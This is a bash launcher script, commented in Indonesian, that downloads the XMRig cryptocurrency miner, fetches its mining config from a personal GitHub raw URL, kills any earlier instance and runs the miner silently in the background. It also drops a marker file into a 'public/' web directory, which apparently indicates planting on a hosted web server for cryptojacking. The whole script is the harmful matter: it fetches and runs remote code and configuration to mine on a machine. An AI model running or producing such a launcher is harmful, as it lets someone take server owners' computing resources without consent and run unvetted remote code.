#!/bin/bash

XMRIG_VER="6.24.0"
XMRIG_DIR="xmrig-$XMRIG_VER"
XMRIG_BIN="./xmrig"
TAR_FILE="xmrig-$XMRIG_VER-linux-static-x64.tar.gz"

CONFIG_URL="https://raw.githubusercontent.com/bintang4/simpel/refs/heads/master/Shshsh.json"
LOG_FILE="xmrig.log"
echo "gans" > public/apaaja.txt
echo "[*] xmrig launcher start"

# ==================================
# KILL xmrig JIKA SUDAH JALAN
# ==================================
if pgrep -x xmrig >/dev/null; then
    echo "[!] xmrig sudah berjalan, kill dulu..."
    pkill -TERM -x xmrig
    sleep 2

    if pgrep -x xmrig >/dev/null; then
        echo "[!] xmrig bandel, SIGKILL..."
        pkill -9 -x xmrig
        sleep 1
    fi

    echo "[✓] xmrig lama dihentikan"
fi

# ==================================
# DOWNLOAD xmrig JIKA BELUM ADA
# ==================================
if [ ! -d "$XMRIG_DIR" ]; then
    echo "[*] Download xmrig..."

    URL="https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VER/$TAR_FILE"

    if command -v wget >/dev/null 2>&1; then
        wget -q "$URL"
        WGET_STATUS=$?
    else
        WGET_STATUS=1
    fi

    if [ $WGET_STATUS -ne 0 ]; then
        echo "[!] wget gagal, coba curl..."
        if command -v curl >/dev/null 2>&1; then
            curl -L --fail -o "$TAR_FILE" "$URL" || {
                echo "[✗] gagal download xmrig (wget & curl)"
                exit 1
            }
        else
            echo "[✗] curl tidak tersedia"
            exit 1
        fi
    fi

    tar -xf "$TAR_FILE" || {
        echo "[✗] gagal extract xmrig"
        exit 1
    }
fi


cd "$XMRIG_DIR" || exit 1
chmod +x xmrig

# ==================================
# DOWNLOAD CONFIG
# ==================================
rm -f config.json
wget -q "$CONFIG_URL" -O config.json || {
    echo "[✗] gagal download config"
    exit 1
}

# ==================================
# GENERATE & INJECT PASS
# ==================================
RAND_PASS="$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 6)"
echo "[+] pass = $RAND_PASS"

if grep -q '"pass"' config.json; then
    sed -i "s/\"pass\"[[:space:]]*:[[:space:]]*\"[^\"]*\"/\"pass\": \"$RAND_PASS\"/" config.json
else
    echo "[!] field pass tidak ditemukan di config.json"
fi

# ==================================
# RUN xmrig
# ==================================
echo "[*] Menjalankan xmrig..."
nice -n 10 "$XMRIG_BIN" > "$LOG_FILE" 2>&1 &

sleep 1
if pgrep -x xmrig >/dev/null; then
    echo "[✓] xmrig running"
else
    echo "[✗] xmrig gagal start, cek $LOG_FILE"
fi
